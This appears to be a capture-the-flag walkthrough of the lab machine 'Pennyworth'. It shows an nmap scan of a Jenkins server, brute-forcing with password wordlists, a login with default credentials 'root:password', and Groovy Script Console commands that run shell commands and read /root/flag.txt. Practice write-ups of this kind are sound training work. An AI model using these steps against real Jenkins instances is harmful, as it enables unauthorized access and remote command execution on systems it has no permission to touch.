>[!tldr] Pennyworth is a very easy Linux machine that focuses on exploiting weak credentials and remote command execution in #Jenkins. Default credentials can be used to get administrative access into Jenkins with which the Script Console can be leveraged to execute Groovy code and obtain a reverse shell.

# Adventure Mode
---
1. Starting off with `nmap`
	`nmap -sT 10.129.4.243 -p- --stats-every=5s`
	-> Ports: `8080`
	`nmap -sCVT 10.129.4.243 -p8080 -vv`
```
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
```
2. Interesting the http service is running `Jetty 9.4.39.v20210325`, lets learn more
>[!Info] What is Jetty?
>Jetty is a lightweight, scalable, and robust Java-based web server and servlet container. It’s known for its efficiency, modularity, and flexibility, making it a popular choice for a wide range of applications, from lightweight microservices to large-scale web applications.
- Not sure if i need that yet, lets investigate with `ZAP` -> `Jenkins` Login page
>[!info] What is Jenkins? Jenkins is an open-source tool that automates various stages of the software development lifecycle.

2. Now with `ZAP` i'm going to brute force the user account `admin` since that is the default username. 
	1. [x] 100k-most-used-passwords-NCSC.txt
		1. `!@#$%^` -> 500 error
	2. [x] 2020-200_most_used_passwords.txt + 2023-200_most_used_passwords.txt + 2024-197_most_used_passwords.txt + 2025-199_most_used_passwords.txt
	- After some research i learned that `root` can also be a default username so instead im going to try that with common credentials 
		- Login -> `root:password`
3. Now that i have access to the dashboard, the only hackable looking feature is `Script Console` which uses `Groovy Script`
```shell
println "ls".execute().text
## Result
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var

println "cat /root/flag.txt".execute().text
## Result
[REDACTED_FLAG]
```
- Flag -> `[REDACTED_FLAG]`